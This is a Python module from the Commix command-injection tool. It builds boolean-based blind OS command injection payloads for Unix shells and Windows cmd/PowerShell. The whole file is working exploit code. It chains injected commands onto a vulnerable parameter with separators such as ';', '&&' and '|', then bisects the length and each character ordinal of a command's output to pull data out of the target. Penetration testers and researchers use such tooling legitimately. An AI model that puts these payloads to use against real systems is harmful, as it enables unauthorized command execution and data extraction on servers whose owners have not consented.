#!/usr/bin/env python
# encoding: UTF-8

"""
This file is part of Commix Project (https://commixproject.com).
Copyright (c) 2014-2026 Anastasios Stasinopoulos (@ancst).

This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.

For more see the file 'readme/COPYING' for copying permission.
"""

from src.utils import settings
from src.core.controller import checks
from src.core.techniques.time_based import tb_payloads

"""
A test chained onto what the parameter already runs, whose exit status is the whole of the answer.

Nothing is printed and nothing is waited for: the target branches on the status the command left
behind, and the page it renders is read as the yes or the no.
"""
def _test(expression):
  return "[ " + expression + " ]"

"""
The separators a question can be asked with using nothing but themselves.

'&' backgrounds what it chains, so a variable set before the test is gone by the time it runs, and
'||' would need a bare pipe to index the output - a second separator either way. Rather than reach
for one, neither is asked at all: a boundary is only worth reporting if the target was shown to
accept the separator the payload is actually made of.
"""
SUPPORTED_SEPARATORS = (";", "\n", "\r\n", "&&", "|")

def _supported(separator):
  if settings.TARGET_OS == settings.OS.WINDOWS:
    return checks.windows_separator(separator) is not None
  # A printed answer needs somewhere to hang the printing off, which a bare pipe has not got: 'if'
  # wants a ';' before its 'then', and '&&' is a separator of its own.
  if settings.BOOLEAN_PRINTED_STATE and separator == "|":
    return False
  return separator in SUPPORTED_SEPARATORS

"""
The test, written so that the page can carry its answer - with the separator under test and nothing
else.

Where the target branches on the exit status the command left behind, the status is the whole of the
answer and the test is left bare. Where it does not - a page that prints what the command said,
whatever it said - the same test is made to print an unguessable marker, and the page then carries
that marker or it does not. Which of the two is in use is settled per target, by trying the first.
"""
def _decide(separator, expression):
  if not settings.BOOLEAN_PRINTED_STATE:
    return _test(expression)
  printing = "echo " + settings.BOOLEAN_MARKER
  # What follows '&&' runs only where what precedes it succeeded, which is the whole conditional.
  if separator == "&&":
    return _test(expression) + separator + printing
  if separator in (";", settings.END_LINE.LF, settings.END_LINE.CRLF):
    return "if " + _test(expression) + separator + "then " + printing + separator + "fi"
  return ""

"""
The command's output held in a variable, and cut down to the byte being asked about.

Written with the separator under test and nothing else. A pipe here would ask the target for a
character it was never shown to accept, and a boundary reported as one separator would in truth
have needed two.
"""
def _var_chain(separator, word, qmarks):
  var = settings.RANDOM_VAR_GENERATOR
  return (var + "=\"" + word + "\"" + separator +
          var + "=\"${" + var + "#" + qmarks + "}\"" + separator +
          var + "=\"${" + var + "%\"${" + var + "#?}\"}\"" + separator)

"""
A question whose answer is known, for telling a target that answers at all from one that does not.
"""
def condition_check(separator, holds=True):
  if not _supported(separator):
    return ""
  if settings.TARGET_OS == settings.OS.WINDOWS:
    chain = checks.windows_separator(separator)
    return checks.windows_boolean_probe(chain, "echo 1", "EQU", "1" if holds else "2")
  return checks.terminate_payload(separator + _decide(separator, "1 -eq " + ("1" if holds else "2")), separator)

"""
The decision payload, which asks the target to print something unguessable and measure it.

A question with a constant answer would be answered by any page that happens to differ between two
requests. This one cannot be: the tag is made fresh for the run, and only a target that actually ran
the command knows how long what it printed is.
"""
def decision(separator, TAG, output_length, holds=True):
  if not _supported(separator):
    return ""
  expected = str(output_length if holds else output_length + 1)
  if settings.TARGET_OS == settings.OS.WINDOWS:
    chain = checks.windows_separator(separator)
    # The target has to print the tag and measure it, so a page that repeats what it was given
    # cannot answer for one that ran the command.
    return checks.windows_boolean_probe(chain,
      "powershell.exe -InputFormat none write ([string](cmd /c echo " + TAG + ")).trim().length",
      "EQU", expected)
  word = tb_payloads._output_word("echo " + TAG)
  var = settings.RANDOM_VAR_GENERATOR
  if separator == "|":
    payload = separator + _decide(separator, "$(printf '%s' \"" + word + "\" | wc -c)" + settings.SINGLE_WHITESPACE + "-eq" + settings.SINGLE_WHITESPACE + expected)
  else:
    payload = (separator + var + "=\"" + word + "\"" + separator +
               _decide(separator, "${#" + var + "}" + settings.SINGLE_WHITESPACE + "-eq" + settings.SINGLE_WHITESPACE + expected))
  return checks.terminate_payload(payload, separator)

"""
How many bytes the command's output is, asked as a comparison so that it can be bisected.

Built with the separator under test and nothing else. Where that separator cannot carry the answer
on its own, nothing is sent at all - a payload that reached for a second separator would report a
boundary the target was never shown to accept.
"""
def get_length(separator, cmd, candidate_length, operator="-eq"):
  word = tb_payloads._output_word(cmd)
  var = settings.RANDOM_VAR_GENERATOR
  compare = _decide(separator, "${#" + var + "}" + settings.SINGLE_WHITESPACE + operator + settings.SINGLE_WHITESPACE + str(candidate_length))

  if not _supported(separator):
    return ""
  if settings.TARGET_OS == settings.OS.WINDOWS:
    chain = checks.windows_separator(separator)
    return checks.windows_boolean_probe(chain,
      "powershell.exe -InputFormat none write ([string](cmd /c " + cmd + ")).trim().length",
      {"-eq": "EQU", "-ge": "GEQ", "-le": "LEQ"}.get(operator, "EQU"), candidate_length)
  if separator == "|":
    # The separator is itself a pipe, so the measurement may be one - and needs no variable.
    payload = separator + _decide(separator, "$(printf '%s' \"" + word + "\" | wc -c)" + settings.SINGLE_WHITESPACE +
                                operator + settings.SINGLE_WHITESPACE + str(candidate_length))
  else:
    payload = separator + var + "=\"" + word + "\"" + separator + compare
  return checks.terminate_payload(payload, separator)

"""
Whether the ordinal of the output's Nth byte is at or above this one, which is what bisects it.
"""
def get_char(separator, cmd, num_of_chars, ascii_char, operator="-le"):
  word = tb_payloads._output_word(cmd)
  qmarks = "?" * (num_of_chars - 1)
  var = settings.RANDOM_VAR_GENERATOR
  var_ordinal = "$(printf '%d' \"'${" + var + "}\")"
  compare = lambda expression, op: _decide(separator, str(ascii_char) + settings.SINGLE_WHITESPACE + op + settings.SINGLE_WHITESPACE + expression)

  if not _supported(separator):
    return ""
  if settings.TARGET_OS == settings.OS.WINDOWS:
    chain = checks.windows_separator(separator)
    # The ordinal is worked out on the target: cmd.exe compares strings by locale collation, so only
    # a number can be binary searched.
    return checks.windows_boolean_probe(chain,
      "powershell.exe -InputFormat none write ([int][char](([string](cmd /c " + cmd + ")).trim().substring(" +
      str(num_of_chars - 1) + ",1)))",
      "GEQ" if operator == "-le" else "EQU", ascii_char)
  if separator == "|":
    # A pipe indexes the output without a variable, which is what lets this stay one separator.
    piped = ("$(printf '%d' \"'$(printf '%s' \"" + word + "\" | tail -c +" + str(num_of_chars) + " | head -c 1)\")")
    payload = separator + compare(piped, operator)
  else:
    payload = separator + _var_chain(separator, word, qmarks) + compare(var_ordinal, operator)
  return checks.terminate_payload(payload, separator)

# eof
